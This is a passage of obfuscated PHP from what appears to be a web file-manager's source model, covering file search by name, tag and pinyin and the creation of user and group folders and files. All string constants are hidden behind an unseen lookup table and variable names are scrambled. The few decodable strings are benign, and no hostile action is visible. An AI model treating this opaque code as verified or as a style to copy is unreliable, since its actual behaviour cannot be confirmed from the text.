_listSearchFileContent(&$®åÇ˜ò, $ïŒÊÃ¡¢, $ñùì’å°, $§ˆƒÌ¿) { $¼ıîµŒæ =& $_SERVER[³Ôà×Ó]; if (!$ïŒÊÃ¡¢[$¼ıîµŒæ[2061]] || $®åÇ˜ò[$¼ıîµŒæ[451]][$¼ıîµŒæ[429]] > 1) { return; } if (!isset($§ˆƒÌ¿[$¼ıîµŒæ[32]]) || !is_array($ïŒÊÃ¡¢[$¼ıîµŒæ[550]])) { return; } $§ˆƒÌ¿[$¼ıîµŒæ[550]] = array($¼ıîµŒæ[7], $ïŒÊÃ¡¢[$¼ıîµŒæ[550]]); unset($§ˆƒÌ¿[$¼ıîµŒæ[32]]); unset($ïŒÊÃ¡¢[$¼ıîµŒæ[550]]); $Àƒ¥Äûı = $this->field($ñùì’å°)->where($§ˆƒÌ¿)->limit($¼ıîµŒæ[2228])->select(); if (!$Àƒ¥Äûı || count($Àƒ¥Äûı) == 0) { return; } $®åÇ˜ò[$¼ıîµŒæ[454]] = array_merge($Àƒ¥Äûı, $®åÇ˜ò[$¼ıîµŒæ[454]]); $®åÇ˜ò[$¼ıîµŒæ[451]][$¼ıîµŒæ[452]] += count($Àƒ¥Äûı); } private function _listSearchTag(&$¹ÂÑÍÖõ, $¨¤„œ³ã, $ˆæÆè) { $È¿œÀşÜ =& $_SERVER[³Ôà×Ó]; if (!$¨¤„œ³ã[$È¿œÀşÜ[2061]] || $¹ÂÑÍÖõ[$È¿œÀşÜ[451]][$È¿œÀşÜ[429]] > 1) { return; } $Ø¨”§è£ = Model($È¿œÀşÜ[2229])->listData(); $ Çà±“Ù = array(); $’©€î = $¨¤„œ³ã[$È¿œÀşÜ[2061]]; foreach ($Ø¨”§è£ as $Üïóïê) { $‚ëŞ—” = $Üïóïê[$È¿œÀşÜ[32]]; $œ‰ë±ù¡ = str_replace($È¿œÀşÜ[53], $È¿œÀşÜ[12], Pinyin::get($‚ëŞ—”)); if (stripos($‚ëŞ—”, $’©€î) !== !1 || stripos($œ‰ë±ù¡, $’©€î) !== !1) { $ Çà±“Ù[] = $Üïóïê[$È¿œÀşÜ[484]]; } } if (!$ Çà±“Ù) { return; } $³ÎÖ«ò† = array($È¿œÀşÜ[509] => array($È¿œÀşÜ[7], $ Çà±“Ù), $È¿œÀşÜ[1765] => USER_ID); $ÜÕÓ–© = Model($È¿œÀşÜ[511])->field($È¿œÀşÜ[87])->where($³ÎÖ«ò†)->select(); $ÜÕÓ–© = array_to_keyvalue($ÜÕÓ–©, $È¿œÀşÜ[12], $È¿œÀşÜ[87]); $ÀÆõßÛİ = array_unique($ÜÕÓ–©); $this->_listSearchMerge($¹ÂÑÍÖõ, $¨¤„œ³ã, $ˆæÆè, $ÀÆõßÛİ); } private function _listSearchDesc(&$ú°­ñÙ, $˜›†ô©, $Õâèß¦©) { $¤ù‚£ÃÀ =& $_SERVER[³Ôà×Ó]; if (!$˜›†ô©[$¤ù‚£ÃÀ[2061]] || $ú°­ñÙ[$¤ù‚£ÃÀ[451]][$¤ù‚£ÃÀ[429]] > 1) { return; } $Ô•öÔº® = array($¤ù‚£ÃÀ[97] => $¤ù‚£ÃÀ[535], $¤ù‚£ÃÀ[459] => array($¤ù‚£ÃÀ[468], $¤ù‚£ÃÀ[2063] . $˜›†ô©[$¤ù‚£ÃÀ[2061]] . $¤ù‚£ÃÀ[2063])); $¾õşßäè = !1; if ($¾õşßäè) { $Ş‹Ãş’ğ = $this->listSearchChildren($˜›†ô©[$¤ù‚£ÃÀ[192]]); $Ş‹Ãş’ğ = array_unique($Ş‹Ãş’ğ); if (!$Ş‹Ãş’ğ) { return; } $Ô•öÔº®[$¤ù‚£ÃÀ[193]] = array($¤ù‚£ÃÀ[7], $Ş‹Ãş’ğ); } $ë¨öƒ±Ğ = Model($¤ù‚£ÃÀ[641])->field($¤ù‚£ÃÀ[193])->where($Ô•öÔº®)->limit(5000)->select(); $óú ¬®– = array_to_keyvalue($ë¨öƒ±Ğ, $¤ù‚£ÃÀ[12], $¤ù‚£ÃÀ[193]); $this->_listSearchMerge($ú°­ñÙ, $˜›†ô©, $Õâèß¦©, $óú ¬®–); } private function _listSearchGroupTag(&$ÚıñœúÌ, $ò½üæëŸ, $ë®ì•¬ê) { $üê†‚Ü =& $_SERVER[³Ôà×Ó]; if (!$ò½üæëŸ[$üê†‚Ü[2061]] || $ÚıñœúÌ[$üê†‚Ü[451]][$üê†‚Ü[429]] > 1 || !$ò½üæëŸ[$üê†‚Ü[192]]) { return; } $ß¶ÔÓÎå = $this->sourceInfo($ò½üæëŸ[$üê†‚Ü[192]]); if (!$ß¶ÔÓÎå || $ß¶ÔÓÎå[$üê†‚Ü[190]] != SourceModel::TYPE_GROUP) { return; } $ÇºÓòÀ = $ß¶ÔÓÎå[$üê†‚Ü[578]]; $›µ•òà” = Model($üê†‚Ü[2230])->get($ÇºÓòÀ); $™æˆ·Òş = array(); $ÛîİÄ‘ = $ò½üæëŸ[$üê†‚Ü[2061]]; foreach ($›µ•òà”[$üê†‚Ü[454]] as $¶›•Ÿª) { $²•Æ¹Ÿñ = $¶›•Ÿª[$üê†‚Ü[32]]; $İ–û„İ = str_replace($üê†‚Ü[53], $üê†‚Ü[12], Pinyin::get($²•Æ¹Ÿñ)); if (stripos($²•Æ¹Ÿñ, $ÛîİÄ‘) !== !1 || stripos($İ–û„İ, $ÛîİÄ‘) !== !1) { $™æˆ·Òş[] = $¶›•Ÿª[$üê†‚Ü[484]]; } } if (!$™æˆ·Òş) { return; } $‡£Ë ­ = array($üê†‚Ü[509] => array($üê†‚Ü[7], $™æˆ·Òş), $üê†‚Ü[1765] => 0, $üê†‚Ü[33] => $üê†‚Ü[2083] . $ÇºÓòÀ); $ÅÚÀ¾ù = Model($üê†‚Ü[511])->field($üê†‚Ü[87])->where($‡£Ë ­)->select(); $ÅÚÀ¾ù = array_to_keyvalue($ÅÚÀ¾ù, $üê†‚Ü[12], $üê†‚Ü[87]); $İ«©Ù’ = array_unique($ÅÚÀ¾ù); $this->_listSearchMerge($ÚıñœúÌ, $ò½üæëŸ, $ë®ì•¬ê, $İ«©Ù’); } private function _listSearchMerge(&$üí›õÜš, $˜ÊëÌ÷ê, $£Ï×éÒí, $¸î¿Ë‘Ö) { $¸¨¢Óç­ =& $_SERVER[³Ôà×Ó]; if (!$¸î¿Ë‘Ö) { return; } $Œ¸ˆì€Å = array_to_keyvalue($üí›õÜš[$¸¨¢Óç­[454]], $¸¨¢Óç­[12], $¸¨¢Óç­[193]); $şœ“åâÎ = array_diff($¸î¿Ë‘Ö, $Œ¸ˆì€Å); if (!$şœ“åâÎ) { return; } $ËÈ‚¾ Ú = array($¸¨¢Óç­[193] => array($¸¨¢Óç­[7], $şœ“åâÎ)); $™•êê‹ = $this->field($£Ï×éÒí)->where($ËÈ‚¾ Ú)->select(); if (!$™•êê‹) { return; } $ëâŠçåş = array(); foreach ($™•êê‹ as $îæÌ™€÷) { if ($this->_listSearchFilter($îæÌ™€÷, $˜ÊëÌ÷ê)) { $ëâŠçåş[] = $îæÌ™€÷; } } $üí›õÜš[$¸¨¢Óç­[454]] = array_merge($ëâŠçåş, $üí›õÜš[$¸¨¢Óç­[454]]); $üí›õÜš[$¸¨¢Óç­[451]][$¸¨¢Óç­[452]] += count($ëâŠçåş); } private function _listSearchFilter($û¦ªñÃ—, $ú–ÔŒ¸ì) { $—šËÃÖ =& $_SERVER[³Ôà×Ó]; $óõóøï† = $û¦ªñÃ—[$—šËÃÖ[494]] == $—šËÃÖ[91]; if (!strstr($û¦ªñÃ—[$—šËÃÖ[593]], $—šËÃÖ[50] . $ú–ÔŒ¸ì[$—šËÃÖ[192]] . $—šËÃÖ[50])) { return !1; } if (isset($ú–ÔŒ¸ì[$—šËÃÖ[495]]) && $ú–ÔŒ¸ì[$—šËÃÖ[495]] != $—šËÃÖ[851]) { if ($ú–ÔŒ¸ì[$—šËÃÖ[495]] == $—šËÃÖ[78] && !$óõóøï†) { return !1; } if ($ú–ÔŒ¸ì[$—šËÃÖ[495]] != $—šËÃÖ[78] && $óõóøï†) { return !1; } if (!strstr($û¦ªñÃ—[$—šËÃÖ[169]], $—šËÃÖ[50] . $ú–ÔŒ¸ì[$—šËÃÖ[495]] . $—šËÃÖ[50])) { return !1; } } if (isset($ú–ÔŒ¸ì[$—šËÃÖ[2231]]) && $ú–ÔŒ¸ì[$—šËÃÖ[2231]] < $û¦ªñÃ—[$—šËÃÖ[79]]) { return !1; } if (isset($ú–ÔŒ¸ì[$—šËÃÖ[2232]]) && $ú–ÔŒ¸ì[$—šËÃÖ[2232]] > $û¦ªñÃ—[$—šËÃÖ[79]]) { return !1; } if (isset($ú–ÔŒ¸ì[$—šËÃÖ[671]]) && $ú–ÔŒ¸ì[$—šËÃÖ[671]] != $û¦ªñÃ—[$—šËÃÖ[538]]) { return !1; } return !0; } public function listSearchChildren($ıÖÚƒ™©, $‹½ºƒ = 5000) { $“ú°Ô¦Ú =& $_SERVER[³Ôà×Ó]; $—¹Æ»ªç = array(); $ß¿Ç¢ı° = $this->sourceInfo($ıÖÚƒ™©); $Ï¥Ğ¯Ñâ = array($“ú°Ô¦Ú[593] => array($“ú°Ô¦Ú[468], $ß¿Ç¢ı°[$“ú°Ô¦Ú[593]] . $ß¿Ç¢ı°[$“ú°Ô¦Ú[193]] . $“ú°Ô¦Ú[622])); $ÙÏ—’³’ = $this->field($“ú°Ô¦Ú[79])->where($Ï¥Ğ¯Ñâ)->limit($‹½ºƒ + 1)->select(); $£Ğí§Œ´ = is_array($ÙÏ—’³’) ? count($ÙÏ—’³’) : 0; if ($£Ğí§Œ´ > $‹½ºƒ) { return $this->_listSearchChildrenNear($ıÖÚƒ™©, $‹½ºƒ); } $²ø²­ô– = $this->field($“ú°Ô¦Ú[193])->where($Ï¥Ğ¯Ñâ)->select(); $—¹Æ»ªç = array_to_keyvalue($²ø²­ô–, $“ú°Ô¦Ú[12], $“ú°Ô¦Ú[193]); return $—¹Æ»ªç; } private function _listSearchChildrenNear($ßŠ‡ä§ğ, $±¶Û­) { $Äç²–ùØ =& $_SERVER[³Ôà×Ó]; $ »¼ß¯ö = array(); $İóóö££ = array($Äç²–ùØ[192] => $ßŠ‡ä§ğ); $ÀÃ—¡Ëë = $this->field($Äç²–ùØ[2233])->where($İóóö££)->select(); $¿¥­ó•× = array_to_keyvalue(array_filter_by_field($ÀÃ—¡Ëë, $Äç²–ùØ[494], $Äç²–ùØ[91]), $Äç²–ùØ[12], $Äç²–ùØ[193]); $ »¼ß¯ö = array_merge($ »¼ß¯ö, array_to_keyvalue($ÀÃ—¡Ëë, $Äç²–ùØ[12], $Äç²–ùØ[193])); if (!$¿¥­ó•×) { return $ »¼ß¯ö; } $İóóö££ = array($Äç²–ùØ[192] => array($Äç²–ùØ[7], $¿¥­ó•×)); $ÀÃ—¡Ëë = $this->field($Äç²–ùØ[2233])->where($İóóö££)->limit($±¶Û­)->select(); $ »¼ß¯ö = array_merge($ »¼ß¯ö, array_to_keyvalue($ÀÃ—¡Ëë, $Äç²–ùØ[12], $Äç²–ùØ[193])); $ »¼ß¯ö = array_slice($ »¼ß¯ö, 0, intval($±¶Û­)); return $ »¼ß¯ö; } private function _listSearchBindPinyin($ø­Ñâ­Õ, &$©Ÿ¯Î¶Æ, &$Ñüæ¹„) { $õÊ¬şß =& $_SERVER[³Ôà×Ó]; if (!isset($ø­Ñâ­Õ[$õÊ¬şß[2061]]) || !$ø­Ñâ­Õ[$õÊ¬şß[2061]]) { return; } if (!Input::check($ø­Ñâ­Õ[$õÊ¬şß[2061]], $õÊ¬şß[394]) || strlen($ø­Ñâ­Õ[$õÊ¬şß[2061]]) < 2) { return; } $™Ç¢ş•‡ = "\114\105\x46\x54\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\163\x6f\x75\x72\x63\x65\137\155\145\x74\x61\x20\155\x65\164\141\x20\157\x6e\40\163\x6f\x75\162\143\145\x2e\x73\157\165\162\143\145\x49\x44\x20\75\x20\x6d\145\x74\x61\x2e\x73\157\x75\x72\x63\x65\111\104"; $ïªÈéÂÌ = array(); $Ñüæ¹„ = str_replace(array($õÊ¬şß[262], $õÊ¬şß[53], $õÊ¬şß[2234]), $õÊ¬şß[12], $Ñüæ¹„); $Ñüæ¹„ = $õÊ¬şß[520] . str_replace($õÊ¬şß[50], $õÊ¬şß[521], $Ñüæ¹„); $ÄûÚãĞ = $©Ÿ¯Î¶Æ[$õÊ¬şß[32]]; unset($©Ÿ¯Î¶Æ[$õÊ¬şß[32]]); foreach ($©Ÿ¯Î¶Æ as $Ó¨Õ€¶’ => $ƒªŠÏ‚¨) { $ïªÈéÂÌ[$õÊ¬şß[520] . $Ó¨Õ€¶’] = $ƒªŠÏ‚¨; } foreach ($ÄûÚãĞ as $ÄºñõŠ€) { $ïªÈéÂÌ[] = array($õÊ¬şß[525] => $ÄºñõŠ€, $õÊ¬şß[1075] => $õÊ¬şß[2065], array($õÊ¬şß[2235] => $ÄºñõŠ€, $õÊ¬şß[2236] => array($õÊ¬şß[7], array($õÊ¬şß[547], $õÊ¬şß[546])))); } $this->join($™Ç¢ş•‡); $©Ÿ¯Î¶Æ = $ïªÈéÂÌ; } private function _parseSearchWhere($«ß¦éú‰) { $Ä½¬‘² =& $_SERVER[³Ôà×Ó]; $¦÷Ù¸ï = array(); if (isset($«ß¦éú‰[$Ä½¬‘²[835]]) && $«ß¦éú‰[$Ä½¬‘²[835]]) { $¦÷Ù¸ï[$Ä½¬‘²[88]] = array($Ä½¬‘²[2237], $«ß¦éú‰[$Ä½¬‘²[835]]); } if (isset($«ß¦éú‰[$Ä½¬‘²[836]]) && $«ß¦éú‰[$Ä½¬‘²[836]]) { $ì¦ù³…ñ = array($Ä½¬‘²[2238], $«ß¦éú‰[$Ä½¬‘²[836]]); if ($¦÷Ù¸ï[$Ä½¬‘²[88]]) { $¦÷Ù¸ï[$Ä½¬‘²[88]] = array($¦÷Ù¸ï[$Ä½¬‘²[88]], $ì¦ù³…ñ, $Ä½¬‘²[2239]); } else { $¦÷Ù¸ï[$Ä½¬‘²[88]] = $ì¦ù³…ñ; } } if (isset($«ß¦éú‰[$Ä½¬‘²[2231]]) && $«ß¦éú‰[$Ä½¬‘²[2231]] > 0) { $¦÷Ù¸ï[$Ä½¬‘²[79]] = array($Ä½¬‘²[2237], $«ß¦éú‰[$Ä½¬‘²[2231]]); } if (isset($«ß¦éú‰[$Ä½¬‘²[2232]]) && $«ß¦éú‰[$Ä½¬‘²[2232]]) { $ì¦ù³…ñ = array($Ä½¬‘²[2238], $«ß¦éú‰[$Ä½¬‘²[2232]]); if ($¦÷Ù¸ï[$Ä½¬‘²[79]]) { $¦÷Ù¸ï[$Ä½¬‘²[79]] = array($¦÷Ù¸ï[$Ä½¬‘²[79]], $ì¦ù³…ñ, $Ä½¬‘²[2239]); } else { $¦÷Ù¸ï[$Ä½¬‘²[79]] = $ì¦ù³…ñ; } } if (isset($«ß¦éú‰[$Ä½¬‘²[671]]) && $«ß¦éú‰[$Ä½¬‘²[671]]) { $¦÷Ù¸ï[] = array($Ä½¬‘²[538] => $«ß¦éú‰[$Ä½¬‘²[671]], $Ä½¬‘²[536] => $«ß¦éú‰[$Ä½¬‘²[671]], $Ä½¬‘²[1075] => $Ä½¬‘²[2065]); } if (isset($«ß¦éú‰[$Ä½¬‘²[495]]) && $«ß¦éú‰[$Ä½¬‘²[495]]) { $ó¸ ãÉ = $«ß¦éú‰[$Ä½¬‘²[495]]; if ($ó¸ ãÉ == $Ä½¬‘²[78]) { $¦÷Ù¸ï[$Ä½¬‘²[494]] = 1; } else { if ($ó¸ ãÉ == $Ä½¬‘²[2240]) { $¦÷Ù¸ï[$Ä½¬‘²[494]] = 0; } else { if ($ó¸ ãÉ) { $ó¸ ãÉ = is_array($ó¸ ãÉ) ? $ó¸ ãÉ : explode($Ä½¬‘²[50], $ó¸ ãÉ); $¦÷Ù¸ï[$Ä½¬‘²[495]] = array($Ä½¬‘²[501], $ó¸ ãÉ); $¦÷Ù¸ï[$Ä½¬‘²[494]] = 0; } } } } $this->_parseSearchParent($«ß¦éú‰, $¦÷Ù¸ï); if (isset($«ß¦éú‰[$Ä½¬‘²[2061]]) && trim($«ß¦éú‰[$Ä½¬‘²[2061]])) { $¦†Šñı­ = trim($«ß¦éú‰[$Ä½¬‘²[2061]]); $šªÑ´Ç¬ = explode($Ä½¬‘²[53], $¦†Šñı­); if (strlen($¦†Šñı­) > 2 && (substr($¦†Šñı­, 0, 1) == $Ä½¬‘²[121] && substr($¦†Šñı­, -1) == $Ä½¬‘²[121]) || substr($¦†Šñı­, 0, 1) == $Ä½¬‘²[58] && substr($¦†Šñı­, -1) == $Ä½¬‘²[58]) { $¦†Šñı­ = substr($¦†Šñı­, 1, -1); $šªÑ´Ç¬ = array($¦†Šñı­); } $¦÷Ù¸ï[$Ä½¬‘²[32]] = array(array($Ä½¬‘²[621], $Ä½¬‘²[2063] . $¦†Šñı­ . $Ä½¬‘²[2063])); if (count($šªÑ´Ç¬) > 1) { $¦÷Ù¸ï[$Ä½¬‘²[32]] = array(); foreach ($šªÑ´Ç¬ as $ÁéêœæÔ) { if (!trim($ÁéêœæÔ)) { continue; } $¦÷Ù¸ï[$Ä½¬‘²[32]][] = array($Ä½¬‘²[621], $Ä½¬‘²[2063] . trim($ÁéêœæÔ) . $Ä½¬‘²[2063]); } } } return $¦÷Ù¸ï; } private function _parseSearchParent($•Õâ‡è, &$Èí«İŒ) { $Êª›¡ =& $_SERVER[³Ôà×Ó]; if (!isset($•Õâ‡è[$Êª›¡[192]]) || !$•Õâ‡è[$Êª›¡[192]]) { return; } $Úü·Á¿³ = $this->pathInfo($•Õâ‡è[$Êª›¡[192]]); $¼“ÒÜø = $Úü·Á¿³[$Êª›¡[192]] . $Êª›¡[12] === $Êª›¡[228]; $ÈÔ†Èß² = $Úü·Á¿³[$Êª›¡[190]] == $Êª›¡[587]; if ($Úü·Á¿³[$Êª›¡[604]] == $Êª›¡[605]) { $˜ğî§¦ = $this->sourceInfo($•Õâ‡è[$Êª›¡[192]]); $Úü·Á¿³[$Êª›¡[593]] = $˜ğî§¦[$Êª›¡[593]]; } $Èí«İŒ[$Êª›¡[661]] = array($Êª›¡[621], $Úü·Á¿³[$Êª›¡[593]] . $•Õâ‡è[$Êª›¡[192]] . $Êª›¡[622]); $†Š³å–ö = isset($•Õâ‡è[$Êª›¡[1922]]) && in_array($Êª›¡[587], $•Õâ‡è[$Êª›¡[1922]]); if (!$†Š³å–ö || !$ÈÔ†Èß² || !$¼“ÒÜø || !$Úü·Á¿³[$Êª›¡[496]]) { return; } if (!AuthModel::authCheckRoot($Úü·Á¿³[$Êª›¡[496]][$Êª›¡[497]])) { return; } $—“ıôÏª = $Úü·Á¿³[$Êª›¡[578]] . $Êª›¡[12]; if ($—“ıôÏª == $Êª›¡[91]) { unset($Èí«İŒ[$Êª›¡[661]]); $Èí«İŒ[$Êª›¡[190]] = self::TYPE_GROUP; return; } $ı«÷ıÄÜ = Model($Êª›¡[594])->groupChildrenAll($—“ıôÏª); $’¸üÈ – = count($ı«÷ıÄÜ); if ($’¸üÈ – <= 1) { return; } $„²Ç¼§ = array($Êª›¡[192] => 0, $Êª›¡[190] => self::TYPE_GROUP, $Êª›¡[578] => array($Êª›¡[7], $ı«÷ıÄÜ)); $’Åğ†óø = $this->field($Êª›¡[2241])->where($„²Ç¼§)->limit($’¸üÈ –)->select(); $Èí«İŒ[$Êª›¡[661]] = array(); foreach ($’Åğ†óø as $”­»®) { $Èí«İŒ[$Êª›¡[661]][] = array($Êª›¡[621], $Êª›¡[603] . $”­»®[$Êª›¡[193]] . $Êª›¡[622]); } $Èí«İŒ[$Êª›¡[661]][] = $Êª›¡[2065]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ãÉ‰ë¹â) { $©éñòº÷ =& $_SERVER[³Ôà×Ó]; $–˜áöæğ = Model($©éñòº÷[586])->where(array($©éñòº÷[1756] => $ãÉ‰ë¹â))->find(); $¦ãŞ’¶å = $this->_mkdirRoot(SourceModel::TYPE_USER, $ãÉ‰ë¹â, $–˜áöæğ[$©éñòº÷[32]]); $this->userDesktopAdd($¦ãŞ’¶å); return $¦ãŞ’¶å; } public function userDesktopAdd($«³ûö¿š) { $ãÌÑ³æ† =& $_SERVER[³Ôà×Ó]; $·‚äÇÙ = LNG($ãÌÑ³æ†[2242]); $±ñéÕËº = $this->mkdir($«³ûö¿š, $·‚äÇÙ); $this->metaSet($±ñéÕËº, $ãÌÑ³æ†[2243], $ãÌÑ³æ†[91]); $this->metaSet($«³ûö¿š, $ãÌÑ³æ†[2244], $±ñéÕËº); } public function userPathSafeAdd($®è·ÎÅ») { $¨ˆ·—À =& $_SERVER[³Ôà×Ó]; $­Ç¶¿İ© = Model($¨ˆ·—À[586])->getInfoFull($®è·ÎÅ»); if (!$­Ç¶¿İ©) { return !1; } if (_get($­Ç¶¿İ©, $¨ˆ·—À[608])) { return $­Ç¶¿İ©[$¨ˆ·—À[548]][$¨ˆ·—À[2245]]; } $ÅÑÃîİş = $this->_mkdirRoot(SourceModel::TYPE_USER, $®è·ÎÅ», $¨ˆ·—À[2246], $¨ˆ·—À[515]); Model($¨ˆ·—À[586])->metaSet($®è·ÎÅ», $¨ˆ·—À[2245], $ÅÑÃîİş); $this->metaSet($ÅÑÃîİş, $¨ˆ·—À[2247], $®è·ÎÅ»); return $ÅÑÃîİş; } public function groupRootAdd($¡¶Áú‘œ) { $ÊØò¬á =& $_SERVER[³Ôà×Ó]; $áËšÆ­Á = Model($ÊØò¬á[594])->where(array($ÊØò¬á[2055] => $¡¶Áú‘œ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¡¶Áú‘œ, $áËšÆ­Á[$ÊØò¬á[32]]); } public function systemRootPathAdd($»«ÚÓòò) { if ($»«ÚÓòò != $_SERVER[³Ôà×Ó][614]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $»«ÚÓòò); } public function userRootRemove($‰íåÁğ) { $™¨’Ô¦÷ = $this->targetSourceRoot(SourceModel::TYPE_USER, $‰íåÁğ, !0); foreach ($™¨’Ô¦÷ as $’Ä›áì§) { if (!$’Ä›áì§) { continue; } $this->remove($’Ä›áì§[$_SERVER[³Ôà×Ó][193]], !1); } } public function groupRootRemove($ö½Éëßƒ) { $’×ÒÁ¡á = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ö½Éëßƒ); if (!$’×ÒÁ¡á) { return; } $this->remove($’×ÒÁ¡á[$_SERVER[³Ôà×Ó][193]], !1); } private function _mkdirRoot($ì¥—Ú‰½, $Úíˆ±¡, $ÍŸ§ß¡, $áªõ­ùá = '') { $£»îÌü« =& $_SERVER[³Ôà×Ó]; $ íÍ«Õô = defined($£»îÌü«[2189]) ? USER_ID : 0; $¶Ñº³åÄ = array($£»îÌü«[486] => 0, $£»îÌü«[657] => $ì¥—Ú‰½, $£»îÌü«[658] => $Úíˆ±¡, $£»îÌü«[655] => 1, $£»îÌü«[659] => $ íÍ«Õô, $£»îÌü«[660] => $ íÍ«Õô, $£»îÌü«[656] => $áªõ­ùá, $£»îÌü«[661] => $£»îÌü«[603], $£»îÌü«[513] => 0, $£»îÌü«[626] => 0, $£»îÌü«[551] => 0, $£»îÌü«[662] => $£»îÌü«[12]); if ($ñû¶œüã = $this->where($¶Ñº³åÄ)->find()) { return $ñû¶œüã[$£»îÌü«[193]]; } $”à€ŒÆ = "\115\x6f\x64\145\x6c\123\x6f\165\162\x63\145\56\x6d\x6b\144\151\162\x52\157\x6f\164\56{$ì¥—Ú‰½}\x2e{$Úíˆ±¡}\56" . $ÍŸ§ß¡; CacheLock::lock($”à€ŒÆ); $¶Ñº³åÄ[$£»îÌü«[32]] = $ÍŸ§ß¡; $Ğ½”•Û² = $this->add($¶Ñº³åÄ); $Í®¿³œÜ = array($£»îÌü«[663] => short_id($Ğ½”•Û²)); $this->where(array($£»îÌü«[500] => $Ğ½”•Û²))->save($Í®¿³œÜ); CacheLock::unlock($”à€ŒÆ); return $Ğ½”•Û²; } private function targetSourceRoot($’æÑòş÷, $•Õ÷³––, $èÁº¥±ñ = false) { $Èá…š¦ =& $_SERVER[³Ôà×Ó]; $Îñ‡Óª  = array($Èá…š¦[486] => 0, $Èá…š¦[657] => $’æÑòş÷, $Èá…š¦[658] => $•Õ÷³––); if ($èÁº¥±ñ) { $ƒŒñ•œ = $this->where($Îñ‡Óª )->select(); return $ƒŒñ•œ ? $ƒŒñ•œ : array(); } $ÊØ§²‹ı = $this->where($Îñ‡Óª )->find(); return $ÊØ§²‹ı ? $ÊØ§²‹ı : array(); } public function sourceRootGroup($ŞÁñàºÌ) { $Ï—™·°Í =& $_SERVER[³Ôà×Ó]; if (is_string($ŞÁñàºÌ)) { $ŞÁñàºÌ = array($ŞÁñàºÌ); } $ùŸ¾§¨Ü = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ŞÁñàºÌ, $Ï—™·°Í[220]); $²¼åÓÈ = array($Ï—™·°Í[454] => $ùŸ¾§¨Ü, $Ï—™·°Í[451] => array($Ï—™·°Í[833] => count($ŞÁñàºÌ))); $this->_listDataApply($²¼åÓÈ[$Ï—™·°Í[454]]); $this->_listMake($²¼åÓÈ); return array_to_keyvalue($²¼åÓÈ[$Ï—™·°Í[85]], $Ï—™·°Í[578]); } public function mkfile($ßî¤àÉ, $—ØÌóÄô, $ÔÓ¹ú£à = '', $ÜØÌşƒ­ = REPEAT_RENAME) { $¿¸•ëñ =& $_SERVER[³Ôà×Ó]; $‚øÎô÷ = Model($¿¸•ëñ[683])->addFileByContent($ÔÓ¹ú£à, $—ØÌóÄô); return $this->_createFileCall($ßî¤àÉ, $—ØÌóÄô, $‚øÎô÷, $ÜØÌşƒ­, $¿¸•ëñ[1424]); } public function addFile($ëÅö¬”È, $¥ˆ€‘Èõ, $¬¶¢¯ ±, $Ôìµİæ = false, $ÇºïÄã = REPEAT_RENAME) { $à¹ùïÎƒ = Model($_SERVER[³Ôà×Ó][683])->addFile($¥ˆ€‘Èõ, $¬¶¢¯ ±, $Ôìµİæ); return $this->_createFileCall($ëÅö¬”È, $¬¶¢¯ ±, $à¹ùïÎƒ, $ÇºïÄã); } public function addFileByFileID($ïµÖœ´, $Ù×÷·¼¤, $üâ´û»Ş, $ğ¼ÉäûÍ = REPEAT_RENAME) { $˜Í›Òöğ =& $_SERVER[³Ôà×Ó]; $ÖÚ™èá = Model($˜Í›Òöğ[683])->find($Ù×÷·¼¤); Model($˜Í›Òöğ[683])->linkAdd($Ù×÷·¼¤); return $this->_createFileCall($ïµÖœ´, $üâ´û»Ş, $ÖÚ™èá, $ğ¼ÉäûÍ); } public function addFileByRemote($úÍäå„¾, $Èèœï¸, $Òñâ½¾, $è²ÖÉÈ˜ = array(), $Ñ„”©„ = REPEAT_RENAME) { $ ›çüÖù = Model($_SERVER[³Ôà×Ó][683])->addFileByRemote($Èèœï¸, $Òñâ½¾, $è²ÖÉÈ˜); return $this->_createFileCall($úÍäå„¾, $Òñâ½¾, $ ›çüÖù, $Ñ„”©„); } private function _createFileCall($á™½İØÅ, $µÍÏ°Û, $êœ¨ßÖÆ, $ÓáñŠ‡º, $ÀæŸö´‘ = "\x75\160\154\157\141\144") { $…íà«ƒ¯ =& $_SERVER[³Ôà×Ó]; $í“Ù¶ = !1; $this->setMasterDB(); $this->lockWriteStart($á™½İØÅ, $µÍÏ°Û); $Ó£Áå Å = $this->fileNameExist($á™½İØÅ, $µÍÏ°Û); $¶Ñ®¨Â… = $this->_createFile($á™½İØÅ, $µÍÏ°Û, $êœ¨ßÖÆ, $ÓáñŠ‡º, $í“Ù¶); if (!$í“Ù¶) { Model($…íà«ƒ¯[553])->remove($êœ¨ßÖÆ[$…íà«ƒ¯[550]]); } if ($í“Ù¶ && $¶Ñ®¨Â… && $¶Ñ®¨Â… != $Ó£Áå Å) { Model($…íà«ƒ¯[2215])->eventCreate($¶Ñ®¨Â…, $ÀæŸö´‘); } $this->lockWriteEnd($á™½İØÅ, $µÍÏ°Û); return $¶Ñ®¨Â…; } public function mkdir($ŠÌ›ç¸ş, $ÃûçÅı…, $»¥â†Ÿî = REPEAT_SKIP) { $æ”’Ö­ =& $_SERVER[³Ôà×Ó]; $this->setMasterDB(); $¤»ôÏ’Ü = $this->sourceInfo($ŠÌ›ç¸ş); if (!$¤»ôÏ’Ü) { return !1; } $this->lockWriteStart($ŠÌ›ç¸ş, $ÃûçÅı…); if ($»¥â†Ÿî !== !1) { $ÃÁÈœ²Å = $this->fileNameExist($ŠÌ›ç¸ş, $ÃûçÅı…); if ($ÃÁÈœ²Å && $»¥â†Ÿî != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ŠÌ›ç¸ş, $ÃûçÅı…); return $ÃÁÈœ²Å; } $ÃûçÅı… = $this->fileNameAuto($ŠÌ›ç¸ş, $ÃûçÅı…, $»¥â†Ÿî); } $ ú¯Ø‡Ê = array($æ”’Ö­[655] => 1, $æ”’Ö­[503] => $ÃûçÅı…, $æ”’Ö­[656] => $æ”’Ö­[12], $æ”’Ö­[551] => 0, $æ”’Ö­[626] => 0); $âã¸–© = $this->_addSource($ ú¯Ø‡Ê, $¤»ôÏ’Ü); Model($æ”’Ö­[2215])->eventCreate($âã¸–©, $æ”’Ö­[1425]); $this->lockWriteEnd($ŠÌ›ç¸ş, $ÃûçÅı…); return $âã¸–©; } public function listSourceRoot($Òå¨á»ˆ, $ˆ³ ’Ø, $×î±û¯ß = 